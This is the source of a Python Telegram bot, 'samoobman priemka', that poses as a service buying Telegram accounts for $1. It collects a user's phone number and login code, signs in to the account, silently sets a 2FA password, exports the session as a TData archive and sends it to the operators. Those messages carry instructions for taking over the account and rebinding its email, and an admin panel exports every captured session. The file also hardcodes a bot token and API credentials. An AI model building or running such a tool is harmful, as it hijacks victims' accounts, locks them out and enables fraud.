# ==========================================
# Проект: samoobman priemka (Telegram Bot)
# Стек: aiogram 3.x, aiosqlite, telethon, opentele
# ==========================================

import asyncio
import logging
import os
import shutil
import aiosqlite
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from opentele.tl import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PhoneCodeEmptyError,
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("samoobman_bot")

# ================= КОНФИГУРАЦИЯ =================
API_TOKEN = "8998218273:AAGrHvaree4LyUR1n2x-dYJ2UX3fqEMEUvk"
ADMIN_IDS = [8887644613]
REQUIRED_CHANNEL = "@samoobmanTG"
LOGS_CHANNEL_ID = -1003813816419

API_ID = 31063615
API_HASH = "dbe3b8f435016b0dcd3e4bca995a9169"
AUTO_PASSWORD = "ssss"

DB_PATH = "database.db"
SESSIONS_DIR = "sessions_data"
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)


# ================= СОСТОЯНИЯ (FSM) =================
class AuthStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()


class AdminStates(StatesGroup):
    waiting_for_user_id_balance = State()
    waiting_for_new_balance = State()
    waiting_for_broadcast_text = State()
    waiting_for_photo_category = State()
    waiting_for_new_photo = State()


class WithdrawStates(StatesGroup):
    waiting_for_amount = State()


# ================= БАЗА ДАННЫХ =================
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS users
                         (
                             user_id
                             INTEGER
                             PRIMARY
                             KEY,
                             username
                             TEXT,
                             full_name
                             TEXT,
                             balance
                             REAL
                             DEFAULT
                             0.0,
                             total_earned
                             REAL
                             DEFAULT
                             0.0,
                             reg_date
                             TEXT
                         )
                         """)
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS accounts
                         (
                             id
                             INTEGER
                             PRIMARY
                             KEY
                             AUTOINCREMENT,
                             user_id
                             INTEGER,
                             phone
                             TEXT
                             UNIQUE,
                             session_name
                             TEXT,
                             date
                             TEXT
                         )
                         """)
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS withdraw_requests
                         (
                             id
                             INTEGER
                             PRIMARY
                             KEY
                             AUTOINCREMENT,
                             user_id
                             INTEGER,
                             amount
                             REAL,
                             status
                             TEXT
                             DEFAULT
                             'pending'
                         )
                         """)
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS settings
                         (
                             key
                             TEXT
                             PRIMARY
                             KEY,
                             value
                             TEXT
                         )
                         """)
        await db.commit()


async def get_user(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
                "SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users WHERE user_id = ?",
                (user_id,)
        ) as cursor:
            return await cursor.fetchone()


async def add_user(user_id: int, username: str, full_name: str, reg_date: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id, username, full_name, reg_date) VALUES (?, ?, ?, ?)",
            (user_id, username, full_name, reg_date),
        )
        await db.commit()


async def get_photo(category: str):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT value FROM settings WHERE key = ?", (f"photo_{category}",)) as cursor:
            row = await cursor.fetchone()
            return row[0] if row else None


async def set_photo(category: str, file_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = ?",
            (f"photo_{category}", file_id, file_id)
        )
        await db.commit()


# ================= УНИВЕРСАЛЬНАЯ ОТПРАВКА С ФОТО =================
async def send_or_edit_message(message_or_callback, text: str, reply_markup: InlineKeyboardMarkup, category: str,
                               parse_mode: str = "Markdown"):
    photo_id = await get_photo(category)

    if isinstance(message_or_callback, CallbackQuery):
        msg = message_or_callback.message
        if photo_id:
            try:
                await msg.delete()
                return await msg.answer_photo(photo=photo_id, caption=text, reply_markup=reply_markup,
                                              parse_mode=parse_mode)
            except Exception:
                return await msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        else:
            try:
                if msg.photo:
                    await msg.delete()
                    return await msg.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
                return await msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
            except Exception:
                return await msg.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
    else:
        if photo_id:
            return await message_or_callback.answer_photo(photo=photo_id, caption=text, reply_markup=reply_markup,
                                                          parse_mode=parse_mode)
        else:
            return await message_or_callback.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)


# ================= КЛАВИАТУРЫ =================
def get_main_keyboard(user_id: int):
    kb = [
        [
            InlineKeyboardButton(text="👤 Профиль", callback_data="menu_profile"),
            InlineKeyboardButton(text="📥 Сдать ТГ аккаунт", callback_data="menu_submit_tg"),
        ],
        [
            InlineKeyboardButton(text="💰 Вывод средств", callback_data="menu_withdraw")
        ],
    ]
    if user_id in ADMIN_IDS:
        kb.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=kb)


def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад в меню", callback_data="back_main")]
    ])


async def check_sub(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        return member.status not in ["left", "kicked"]
    except Exception:
        return True


async def send_log(text: str):
    try:
        await bot.send_message(chat_id=LOGS_CHANNEL_ID, text=text, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Не удалось отправить лог: {e}")


# ================= ОБРАБОТЧИКИ (ОСНОВНЫЕ) =================
@router.message(Command("start"))
async def cmd_start(message: Message):
    user = message.from_user
    reg_date = user.date.strftime("%Y-%m-%d %H:%M:%S") if hasattr(user, 'date') else message.date.strftime(
        "%Y-%m-%d %H:%M:%S")
    await add_user(user.id, user.username or "NoUsername", user.full_name, reg_date)

    if not await check_sub(user.id):
        sub_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📢 Подписаться на канал",
                                  url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
            [InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_subscription")],
        ])
        await message.answer(
            "⚠️ Для использования бота **samoobman priemka** необходимо подписаться на наш канал!",
            reply_markup=sub_kb, parse_mode="Markdown"
        )
        return

    text = (
        "👋 Добро пожаловать в официального бота автоскупки аккаунтов!\n\n"
        "🔹 **samoobman priemka** — лучший сервис быстрой и безопасной скупки "
        "ваших Telegram аккаунтов по выгодным ценам.\n\n"
        "Выберите нужный раздел в меню ниже:"
    )
    await send_or_edit_message(message, text, get_main_keyboard(user.id), "main")


@router.callback_query(F.data == "check_subscription")
async def cb_check_sub(callback: CallbackQuery):
    if await check_sub(callback.from_user.id):
        try:
            await callback.message.delete()
        except Exception:
            pass
        text = "✅ Подписка подтверждена! Добро пожаловать в **samoobman priemka**."
        await send_or_edit_message(callback, text, get_main_keyboard(callback.from_user.id), "main")
    else:
        await callback.answer("❌ Вы не подписались на канал!", show_alert=True)


@router.callback_query(F.data == "back_main")
async def cb_back_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    text = "🏠 Главное меню сервиса **samoobman priemka**.\n\nВыберите действие:"
    await send_or_edit_message(callback, text, get_main_keyboard(callback.from_user.id), "main")


@router.callback_query(F.data == "menu_profile")
async def cb_profile(callback: CallbackQuery):
    user_data = await get_user(callback.from_user.id)
    if not user_data:
        return await callback.answer("Ошибка данных пользователя.", show_alert=True)

    uid, username, full_name, balance, total_earned, reg_date = user_data
    text = (
        f"👤 **Ваш профиль в samoobman priemka**\n\n"
        f"• **Имя:** {full_name} (@{username})\n"
        f"• **ID:** `{uid}`\n"
        f"• **Регистрация:** {reg_date}\n"
        f"• **Баланс:** `${balance:.2f}`\n"
        f"• **Заработано:** `${total_earned:.2f}`"
    )
    await send_or_edit_message(callback, text, get_back_keyboard(), "profile")


# ================= АВТОРИЗАЦИЯ И СДАЧА АККАУНТА =================
@router.callback_query(F.data == "menu_submit_tg")
async def cb_submit_tg(callback: CallbackQuery, state: FSMContext):
    text = (
        "📥 **Сдача Telegram аккаунта** в **samoobman priemka**\n\n"
        "Пожалуйста, введите номер телефона вашего аккаунта в международном "
        "формате (например, `+79991112233`):"
    )
    await send_or_edit_message(callback, text, get_back_keyboard(), "submit")
    await state.set_state(AuthStates.waiting_for_phone)


@router.message(AuthStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith("+") or len(phone) < 10:
        return await message.answer(
            "❌ Неверный формат. Номер должен начинаться с плюса (+) и содержать код страны. Попробуйте снова:")

    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT id FROM accounts WHERE phone = ?", (phone,)) as cursor:
            if await cursor.fetchone():
                await state.clear()
                return await message.answer(
                    "❌ Данный номер телефона уже зарегистрирован в системе и не может быть сдан повторно!",
                    reply_markup=get_main_keyboard(message.from_user.id)
                )

    session_name = f"session_{message.from_user.id}_{int(asyncio.get_event_loop().time())}"
    session_path = os.path.join(SESSIONS_DIR, session_name)

    await state.update_data(phone=phone, session_name=session_name, session_path=session_path)

    request_code_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📲 Запросить код", callback_data="request_tg_code")],
        [InlineKeyboardButton(text="⬅️ Назад в меню", callback_data="back_main")]
    ])

    await message.answer(
        f"📱 Номер `{phone}` успешно принят.\n\nНажмите кнопку ниже, чтобы бот запросил код подтверждения в ваш Telegram:",
        reply_markup=request_code_kb, parse_mode="Markdown"
    )


@router.callback_query(F.data == "request_tg_code")
async def cb_request_tg_code(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    phone = data.get("phone")
    session_path = data.get("session_path")

    if not phone or not session_path:
        return await callback.answer("❌ Сессия устарела. Начните заново.", show_alert=True)

    # Исправление ошибки с api_id/api_hash в opentele
    client = TelegramClient(session_path, int(API_ID), API_HASH)

    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        await state.update_data(phone_code_hash=sent.phone_code_hash)

        await callback.message.edit_text(
            "📲 Код подтверждения отправлен в ваш Telegram.\n**Введите полученный 5-значный код в чат:**",
            parse_mode="Markdown"
        )
        await state.set_state(AuthStates.waiting_for_code)
    except FloodWaitError as e:
        await client.disconnect()
        await callback.message.edit_text(
            f"❌ Ограничение Telegram. Попробуйте через {e.seconds} секунд.",
            reply_markup=get_back_keyboard()
        )
    except Exception as e:
        await client.disconnect()
        await callback.message.edit_text(
            f"❌ Ошибка отправки кода: {e}\nПопробуйте заново.", reply_markup=get_back_keyboard()
        )
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


@router.message(AuthStates.waiting_for_code)
async def process_code(message: Message, state: FSMContext):
    code = message.text.strip()
    data = await state.get_data()
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    session_name = data.get("session_name")
    session_path = data.get("session_path")

    if not phone or not session_path:
        return await message.answer("❌ Ошибка сессии. Вернитесь в меню и попробуйте снова.",
                                    reply_markup=get_back_keyboard())

    client = TelegramClient(session_path, int(API_ID), API_HASH)

    try:
        await client.connect()
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
    except SessionPasswordNeededError:
        await message.answer(
            "❌ **На аккаунте установлен облачный пароль (2FA).**\nСнимите пароль в настройках и попробуйте сдать аккаунт заново.",
            parse_mode="Markdown")
        await client.disconnect()
        await state.clear()
        return
    except (PhoneCodeInvalidError, PhoneCodeEmptyError):
        await client.disconnect()
        return await message.answer("❌ Неверный введенный код. Попробуйте еще раз:")
    except Exception as e:
        await message.answer(f"❌ Ошибка авторизации: {e}")
        await client.disconnect()
        await state.clear()
        return

    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT id FROM accounts WHERE phone = ?", (phone,)) as cursor:
            if await cursor.fetchone():
                await client.disconnect()
                await state.clear()
                return await message.answer("❌ Этот аккаунт уже был успешно сдан ранее!",
                                            reply_markup=get_main_keyboard(message.from_user.id))

    try:
        await client.edit_2fa(new_password=AUTO_PASSWORD)
    except Exception as e:
        logger.warning(f"Не удалось установить пароль: {e}")

    tdata_folder = os.path.join(SESSIONS_DIR, f"tdata_{phone.replace('+', '')}_{int(asyncio.get_event_loop().time())}")
    archive_path = None

    try:
        await client.ToTData(dirName=tdata_folder)
        archive_path = shutil.make_archive(tdata_folder, 'zip', tdata_folder)
    except Exception as e:
        logger.error(f"Ошибка TData конвертации: {e}")
    finally:
        await client.disconnect()

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO accounts (user_id, phone, session_name, date) VALUES (?, ?, ?, datetime('now'))",
            (message.from_user.id, phone, session_name)
        )
        await db.execute(
            "UPDATE users SET balance = balance + 1.0, total_earned = total_earned + 1.0 WHERE user_id = ?",
            (message.from_user.id,)
        )
        await db.commit()

    # Инструкция по входу в TData для администратора
    tdata_instruction = (
        "\n\n📖 **Инструкция по входу в аккаунт через TData:**\n"
        "1. Скачайте архив и распакуйте его.\n"
        "2. Скачайте официальную портативную версию Telegram для ПК (Telegram Portable с официального сайта).\n"
        "3. В папке с распакованным Telegram Portable найдите папку `tdata` и удалите её содержимое (либо переименуйте).\n"
        "4. Перенесите файлы из распакованного архива (файлы папки `tdata`) в пустую папку `tdata` вашего Telegram Portable.\n"
        "5. Запустите `Telegram.exe` — аккаунт откроется автоматически без ввода кода (если попросит пароль, укажите указанный выше).\n"
        "6. Перейдите в настройки безопасности и привяжите свою почту/измените данные."
    )

    if archive_path and os.path.exists(archive_path):
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_document(
                    chat_id=admin_id,
                    document=FSInputFile(archive_path),
                    caption=(
                        f"📥 **Новый аккаунт (TData) успешно принят!**\n\n"
                        f"👤 Пользователь: `{message.from_user.id}`\n"
                        f"📱 Телефон: `{phone}`\n"
                        f"🔑 2FA Пароль: `{AUTO_PASSWORD}`"
                        f"{tdata_instruction}"
                    ),
                    parse_mode="Markdown"
                )
            except Exception:
                pass

    await send_log(
        f"🔔 [samoobman priemka] Успешная сдача аккаунта!\nЮзер: `{message.from_user.id}`\nТелефон: `{phone}`")

    await message.answer(
        "✅ Аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс.",
        reply_markup=get_main_keyboard(message.from_user.id), parse_mode="Markdown"
    )
    await state.clear()


# ================= ВЫВОД СРЕДСТВ =================
@router.callback_query(F.data == "menu_withdraw")
async def cb_withdraw(callback: CallbackQuery, state: FSMContext):
    user_data = await get_user(callback.from_user.id)
    if not user_data or user_data[3] <= 0:
        return await callback.answer("❌ У вас нулевой баланс для вывода.", show_alert=True)

    text = (
        f"💰 **Вывод средств в samoobman priemka**\n\n"
        f"Доступный баланс: **${user_data[3]:.2f}**\n"
        f"Введите сумму для вывода:"
    )
    await send_or_edit_message(callback, text, get_back_keyboard(), "withdraw")
    await state.set_state(WithdrawStates.waiting_for_amount)


@router.message(WithdrawStates.waiting_for_amount)
async def process_withdraw(message: Message, state: FSMContext):
    try:
        amount = float(message.text.strip().replace(",", "."))
    except ValueError:
        return await message.answer("❌ Введите корректное число (например: 5 или 10.5):")

    user_data = await get_user(message.from_user.id)
    current_balance = user_data[3]

    if amount <= 0:
        return await message.answer("❌ Сумма вывода должна быть больше нуля:")

    if amount > current_balance:
        return await message.answer(f"❌ Недостаточно средств. Ваш баланс: ${current_balance:.2f}. Введите меньше:")

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, message.from_user.id))
        cursor = await db.execute("INSERT INTO withdraw_requests (user_id, amount) VALUES (?, ?)",
                                  (message.from_user.id, amount))
        req_id = cursor.lastrowid
        await db.commit()

    withdraw_kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=f"✅ Выплатить (${amount})", callback_data=f"pay_success_{req_id}"),
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"pay_cancel_{req_id}"),
    ]])

    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=f"🚨 **Новая заявка на вывод!**\nОт: `{message.from_user.id}`\nСумма: **${amount:.2f}**",
                reply_markup=withdraw_kb, parse_mode="Markdown"
            )
        except Exception:
            pass

    await message.answer(
        f"✅ Заявка на вывод **${amount:.2f}** успешно создана и ожидает выплаты администратором.",
        reply_markup=get_main_keyboard(message.from_user.id), parse_mode="Markdown"
    )
    await state.clear()


@router.callback_query(F.data.startswith("pay_success_"))
async def admin_pay_success(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("⛔ Доступ запрещен.", show_alert=True)
    req_id = int(callback.data.split("_")[2])
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE withdraw_requests SET status = 'paid' WHERE id = ?", (req_id,))
        await db.commit()
    await callback.message.edit_text(f"{callback.message.text}\n\n**[ВЫПЛАЧЕНО ✅]**", parse_mode="Markdown")
    await callback.answer("Выплата отмечена как успешная.")


@router.callback_query(F.data.startswith("pay_cancel_"))
async def admin_pay_cancel(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("⛔ Доступ запрещен.", show_alert=True)
    req_id = int(callback.data.split("_")[2])
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id, amount FROM withdraw_requests WHERE id = ?", (req_id,)) as cursor:
            row = await cursor.fetchone()
            if row:
                uid, amt = row
                await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amt, uid))
                await db.execute("UPDATE withdraw_requests SET status = 'cancelled' WHERE id = ?", (req_id,))
                await db.commit()
                try:
                    await bot.send_message(chat_id=uid,
                                           text=f"❌ Ваша заявка на вывод **${amt:.2f}** отклонена, средства возвращены на баланс.",
                                           parse_mode="Markdown")
                except Exception:
                    pass
    await callback.message.edit_text(f"{callback.message.text}\n\n**[ОТМЕНЕНО ❌]**", parse_mode="Markdown")
    await callback.answer("Заявка отклонена.")


# ================= АДМИН-ПАНЕЛЬ =================
@router.callback_query(F.data == "admin_panel")
async def cb_admin_panel(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("⛔ Доступ запрещен.", show_alert=True)

    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 Выгрузить все TDATA (Zip)", callback_data="admin_export_tdata")],
        [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
        [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
        [InlineKeyboardButton(text="📢 Сделать рассылку", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="🖼 Управление фото разделов", callback_data="admin_manage_photos")],
        [InlineKeyboardButton(text="⬅️ Главное меню", callback_data="back_main")],
    ])
    try:
        await callback.message.edit_text("👑 **Панель администратора samoobman priemka**", reply_markup=admin_kb,
                                         parse_mode="Markdown")
    except Exception:
        await callback.message.answer("👑 **Панель администратора samoobman priemka**", reply_markup=admin_kb,
                                      parse_mode="Markdown")
    await callback.answer()


@router.callback_query(F.data == "admin_export_tdata")
async def admin_export_tdata(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("⛔ Доступ запрещен.", show_alert=True)
    archive_name = "all_tdata_archives"
    if os.path.exists(SESSIONS_DIR) and os.listdir(SESSIONS_DIR):
        shutil.make_archive(archive_name, 'zip', SESSIONS_DIR)
        await callback.message.answer_document(
            document=FSInputFile(f"{archive_name}.zip"),
            caption="📦 Полный архив всех сданных сессий и TData папок.",
            parse_mode="Markdown"
        )
        await callback.answer()
    else:
        await callback.answer("📁 Папка с сессиями пуста.", show_alert=True)


@router.callback_query(F.data == "admin_export_txt")
async def admin_export_txt(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("⛔ Доступ запрещен.", show_alert=True)
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
                "SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users") as cursor:
            rows = await cursor.fetchall()

    file_path = "users_detailed_table.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("=" * 95 + "\n")
        f.write(
            f"{'ID':<12} | {'USERNAME':<16} | {'FULL NAME':<20} | {'BALANCE':<10} | {'EARNED':<10} | {'REG DATE'}\n")
        f.write("=" * 95 + "\n")
        for r in rows:
            uid, uname, fname, bal, earned, date = r
            f.write(
                f"{uid:<12} | @{str(uname):<15} | {str(fname)[:19]:<20} | ${float(bal):<9.2f} | ${float(earned):<9.2f} | {date}\n")
        f.write("=" * 95 + "\n")

    await callback.message.answer_document(
        document=FSInputFile(file_path),
        caption="📊 Красивая таблица всех пользователей системы.",
        parse_mode="Markdown"
    )
    await callback.answer()


@router.callback_query(F.data == "admin_change_balance")
async def admin_change_bal_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("⛔ Доступ запрещен.", show_alert=True)
    await callback.message.answer("Введите Telegram ID пользователя:")
    await state.set_state(AdminStates.waiting_for_user_id_balance)
    await callback.answer()


@router.message(AdminStates.waiting_for_user_id_balance)
async def admin_get_uid(message: Message, state: FSMContext):
    try:
        uid = int(message.text.strip())
    except ValueError:
        return await message.answer("❌ Неверный ID. Введите числовой Telegram ID:")

    user = await get_user(uid)
    if not user:
        await state.clear()
        return await message.answer("❌ Пользователь с таким ID не найден в базе данных.")

    await state.update_data(target_uid=uid)
    await message.answer(f"👤 Найден: {user[2]} (@{user[1]})\nБаланс: ${user[3]:.2f}\n\nВведите новый баланс (число):")
    await state.set_state(AdminStates.waiting_for_new_balance)


@router.message(AdminStates.waiting_for_new_balance)
async def admin_set_balance(message: Message, state: FSMContext):
    try:
        new_bal = float(message.text.strip().replace(",", "."))
    except ValueError:
        return await message.answer("❌ Введите корректное число для баланса:")

    data = await state.get_data()
    uid = data["target_uid"]

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new_bal, uid))
        await db.commit()

    await message.answer(f"✅ Баланс юзера `{uid}` успешно изменен на **${new_bal:.2f}**.", parse_mode="Markdown")
    await state.clear()


@router.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("⛔ Доступ запрещен.", show_alert=True)
    await callback.message.answer("📢 Введите текст рассылки для всех пользователей:")
    await state.set_state(AdminStates.waiting_for_broadcast_text)
    await callback.answer()


@router.message(AdminStates.waiting_for_broadcast_text)
async def admin_send_broadcast(message: Message, state: FSMContext):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id FROM users") as cursor:
            users = await cursor.fetchall()
    count = 0
    for u in users:
        try:
            await bot.send_message(chat_id=u[0], text=f"📢 **Рассылка от samoobman priemka**\n\n{message.text}",
                                   parse_mode="Markdown")
            count += 1
            await asyncio.sleep(0.04)
        except Exception:
            pass
    await message.answer(f"✅ Рассылка завершена. Успешно отправлено: `{count}` пользователям.", parse_mode="Markdown")
    await state.clear()


@router.callback_query(F.data == "admin_manage_photos")
async def admin_manage_photos(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("⛔ Доступ запрещен.", show_alert=True)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🖼 Главное меню", callback_data="setphoto_main")],
        [InlineKeyboardButton(text="🖼 Профиль", callback_data="setphoto_profile")],
        [InlineKeyboardButton(text="🖼 Вывод средств", callback_data="setphoto_withdraw")],
        [InlineKeyboardButton(text="🖼 Сдать ТГ аккаунт", callback_data="setphoto_submit")],
        [InlineKeyboardButton(text="⬅️ В админ-панель", callback_data="admin_panel")],
    ])
    await callback.message.edit_text("Выберите категорию, в которую хотите добавить/изменить фото:", reply_markup=kb)
    await callback.answer()


@router.callback_query(F.data.startswith("setphoto_"))
async def admin_set_photo_category(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("⛔ Доступ запрещен.", show_alert=True)
    category = callback.data.split("_")[1]
    await state.update_data(photo_category=category)
    await callback.message.answer(
        f"📸 Отправьте изображение (картинку), которое будет прикрепляться к категории: **{category}**")
    await state.set_state(AdminStates.waiting_for_new_photo)
    await callback.answer()


@router.message(AdminStates.waiting_for_new_photo, F.photo)
async def admin_save_new_photo(message: Message, state: FSMContext):
    data = await state.get_data()
    category = data.get("photo_category")
    file_id = message.photo[-1].file_id

    await set_photo(category, file_id)
    await message.answer(f"✅ Фото для категории **{category}** успешно сохранено!", parse_mode="Markdown")
    await state.clear()


@router.message(AdminStates.waiting_for_new_photo)
async def admin_wrong_photo(message: Message):
    await message.answer("❌ Вы не прикрепили картинку. Пожалуйста, отправьте именно фото:")


# ================= ЗАПУСК БОТА =================
async def main():
    await init_db()
    logger.info("Бот samoobman priemka успешно запущен!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())